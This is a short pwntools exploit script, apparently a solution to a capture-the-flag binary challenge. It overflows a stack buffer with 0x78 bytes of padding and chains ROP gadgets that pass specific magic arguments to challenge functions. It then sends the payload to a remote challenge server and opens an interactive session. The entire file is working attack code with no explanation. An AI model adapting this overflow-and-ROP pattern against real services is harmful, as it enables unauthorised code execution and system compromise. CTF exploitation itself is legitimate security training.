from pathlib import Path
from pwn import *

e = ELF('./pwn')
#prc = process("./pwn")
prc = remote("bin.magpiectf.ca", 1982)

# min bytes to segfault
padding = b'a' * 0x78

# gadget addresses
pop_rdi = p64(0x4012b3)
pop_rsi = p64(0x4012b1)

# arguments
arg1 = p64(0xb16bad)
arg2 = p64(0xbadf00d)
arg3 = p64(0xfee1dead)
dummyv = p64(0x1337)

# function addresses
add_bin = p64(e.symbols['FUN_10032812'])
add_she  = p64(e.symbols['FUN_10021883'])
exec_st = p64(e.symbols['FUN_100847311'])

# function calls
add_bin_call = pop_rdi + arg1 + add_bin
add_she_call = pop_rdi + arg2 + pop_rsi + arg3 + dummyv + add_she

payload = padding + add_bin_call + add_she_call + exec_st

prc.sendline(payload)
prc.interactive()
